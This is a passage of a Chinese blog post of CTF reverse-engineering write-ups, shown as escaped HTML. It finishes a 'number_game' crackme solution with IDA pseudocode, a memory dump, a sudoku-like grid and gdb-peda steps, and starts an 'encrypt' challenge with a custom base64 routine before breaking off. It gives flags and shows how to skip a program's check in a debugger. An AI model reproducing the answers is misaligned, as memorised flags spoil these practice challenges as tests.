        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_601060 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_601060 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k) )
          v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_601060 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_601060 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i) )
          v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      }
    }
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;要求在某条件下unk_601060中的两个字符不相同&lt;/p&gt;
&lt;p&gt;再查看一下中间的几个函数&lt;/p&gt;
&lt;p&gt;先查看 &lt;code&gt;sub_400881&lt;/code&gt; 函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_400881&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; result; &lt;span style=&#34;color:#75715e&#34;&gt;// rax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  byte_601062 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1;
  byte_601067 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
  byte_601069 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
  byte_60106B &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
  byte_60106E &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
  byte_60106F &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;];
  byte_601071 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;];
  byte_601072 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;];
  byte_601076 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;];
  result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;];
  byte_601077 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;];
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;是将a1中的数据放到指定的内存位置上&lt;/p&gt;
&lt;p&gt;查看这个内存地址&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;data:0000000000601060 unk_601060      db  31h ; 1
.data:0000000000601061                 db  34h ; 4
.data:0000000000601062 byte_601062     db 23h                  ; DATA XREF: sub_400881+F↑w
.data:0000000000601063                 db  32h ; 2
.data:0000000000601064                 db  33h ; 3
.data:0000000000601065                 db  33h ; 3
.data:0000000000601066                 db  30h ; 0
.data:0000000000601067 byte_601067     db 23h                  ; DATA XREF: sub_400881+1D↑w
.data:0000000000601068                 db  31h ; 1
.data:0000000000601069 byte_601069     db 23h                  ; DATA XREF: sub_400881+2B↑w
.data:000000000060106A                 db  30h ; 0
.data:000000000060106B byte_60106B     db 23h                  ; DATA XREF: sub_400881+39↑w
.data:000000000060106C                 db  32h ; 2
.data:000000000060106D                 db  33h ; 3
.data:000000000060106E byte_60106E     db 23h                  ; DATA XREF: sub_400881+47↑w
.data:000000000060106F byte_60106F     db 23h                  ; DATA XREF: sub_400881+55↑w
.data:0000000000601070                 db  33h ; 3
.data:0000000000601071 byte_601071     db 23h                  ; DATA XREF: sub_400881+63↑w
.data:0000000000601072 byte_601072     db 23h                  ; DATA XREF: sub_400881+71↑w
.data:0000000000601073                 db  30h ; 0
.data:0000000000601074                 db  34h ; 4
.data:0000000000601075                 db  32h ; 2
.data:0000000000601076 byte_601076     db 23h                  ; DATA XREF: sub_400881+7F↑w
.data:0000000000601077 byte_601077     db 23h                  ; DATA XREF: sub_400881+8D↑w
.data:0000000000601078                 db  31h ; 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现与 &lt;code&gt;unk_601060&lt;/code&gt; 对应&lt;/p&gt;
&lt;p&gt;说明这个程序是将输入数据填到指定内存上，然后判断是否符合某个特殊条件&lt;/p&gt;
&lt;p&gt;由于总共有25个字符，并且程序中出现了形如 &lt;code&gt;5 * i + j&lt;/code&gt; 的值，以及题目名称 &lt;code&gt;number_game&lt;/code&gt; 推测是一种类似数独的填数游戏，每行每列数字只能为01234且不能重复&lt;/p&gt;
&lt;p&gt;查看已有的数字&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;14 23
30 1 
0 23 
 3  0
42  1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么最后v7中应该为 &lt;code&gt;0421421430&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;简单查看了 &lt;code&gt;sub_400758&lt;/code&gt; 和 &lt;code&gt;sub_400807&lt;/code&gt; 后，确定这两个函数只进行了顺序的转换，只要得知其结果就可以&lt;/p&gt;
&lt;p&gt;因此使用gdb进行动态调试，目的是找到这两个函数的顺序调换结果&lt;/p&gt;
&lt;p&gt;首先 &lt;code&gt;start&lt;/code&gt; 运行程序&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;gdb-peda$ start
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 &lt;code&gt;0x40a62&lt;/code&gt; 处打上断点（输入后，第一个if前）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;gdb-peda$ b *0x400a62
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行，并输入 &lt;code&gt;0123456789&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接下来需要绕过第一个if判断&lt;/p&gt;
&lt;p&gt;在调用函数前修改eip，直接跳到jz后面&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;gdb-peda$ set var $rip&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0x400a76
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来需要查看两个函数运行后的值，这个值是 &lt;code&gt;sub_400881&lt;/code&gt; 的参数，因此在call这个函数前打上断点，并查看 rdi 寄存器的结果即可&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;gdb-peda$ b *0x400aae
Breakpoint &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; at 0x400aae
gdb-peda$ c
Continuing.
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;----------------------------------registers-----------------------------------&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
RAX: 0x7ffffffedf40
RBX: 0x400b20 --&amp;gt; 0x41ff894156415741
RCX: 0xe
RDX: 0x7ffffffedf40
RSI: 0x7ffffffedf40
RDI: 0x7ffffffedf40
RBP: 0x7ffffffedf60
RSP: 0x7ffffffedf20
RIP: 0x400aae --&amp;gt; 0xb8fffffdcee8
R8 : 0x6033d0 --&amp;gt; 0x36 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;6&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
R9 : 0x7c &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
R10: 0x4003ce --&amp;gt; 0x5f00636f6c6c616d &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;malloc&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
R11: 0x7fffff78bbe0 --&amp;gt; 0x6033e0 --&amp;gt; 0x0
R12: 0x4005e0 --&amp;gt; 0x89485ed18949ed31
R13: 0x7ffffffee050
R14: 0x0
R15: 0x0
EFLAGS: 0x246 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;carry PARITY adjust ZERO sign trap INTERRUPT direction overflow&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-------------------------------------code-------------------------------------&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x400aa3:    mov    BYTE PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x16&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,0x0
   0x400aa7:    lea    rax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x20&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x400aab:    mov    rdi,rax
&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; 0x400aae:    call   0x400881
   0x400ab3:    mov    eax,0x0
   0x400ab8:    call   0x400917
   0x400abd:    test   eax,eax
   0x400abf:    je     0x400afc
Guessed arguments:
arg&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: 0x7ffffffedf40
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;------------------------------------stack-------------------------------------&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
Invalid $SP address: 0x7ffffffedf20
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;------------------------------------------------------------------------------&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
Legend: code, data, rodata, value

Breakpoint 3, 0x0000000000400aae in ?? &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意到 &lt;code&gt;RDI: 0x7ffffffedf40&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因此查看这个内存地址下的值即可&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;gdb-peda$ x/2x 0x7ffffffedf40
0x7ffffffedf40: 0x3530343931383337      0x0000000000003632
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;根据小端模式&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0123456789&lt;/code&gt; 被转换为 &lt;code&gt;7381940526&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;根据这个信息将 &lt;code&gt;0421421430&lt;/code&gt; 还原，得到 &lt;code&gt;1134240024&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;运行程序&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ ./number_game
&lt;span style=&#34;color:#ae81ff&#34;&gt;1134240024&lt;/span&gt;
TQL!
flag&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;1134240024&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;guetctf2019encrypt&#34;&gt;[GUETCTF2019]encrypt&lt;/h2&gt;
&lt;p&gt;拖入ida，查看主函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;please input your flag:&amp;#34;&lt;/span&gt;, a2, v19);
  scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s);
  memset(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v9, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x408uLL&lt;/span&gt;);
  sub_4006B6(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v9, (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v10, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;);
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s);
  sub_4007DB(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v9, (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s, v3);
  v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s);
  sub_4008FA((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s, v4, v19, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v6);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v19[i] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; byte_602080[i] )
    {
      puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong&amp;#34;&lt;/span&gt;);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
    }
  }
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Good&amp;#34;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在进行判断前执行了三个函数&lt;/p&gt;
&lt;p&gt;最后一个函数是一个类base64&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v20 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; a2 )
  {
    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v20&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v4 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a1);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v20 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; a2 )
    {
      v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    {
      v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v20&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
      v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v5 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a1);
    }
    v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v6;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v20 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; a2 )
    {
      v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    {
      v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v20&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
      v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v7 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a1);
    }
    v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v8;
    v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v19;
    v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v19 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    a3[v10] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v17 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3F&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;;
    v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v11&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    a3[v12] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((((v18 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v17) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3F&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;;
    a3[v11] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((((v9 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v18) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3F&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;;
    v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v11 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    v19 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v11 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
    a3[v13] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v9 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3F&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( a2 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
  {
    a3[&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;v19] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( a2 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_15;
  }
  a3[v19 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将每一位减少61后映射到base64的字符串上就可以得到base64结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Z`TzzTrD|fQP[_VVL|yneURyUmFklVJgLasJroZpHRxIUlH&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;vZE&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 注意转义字符&lt;/span&gt;
base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
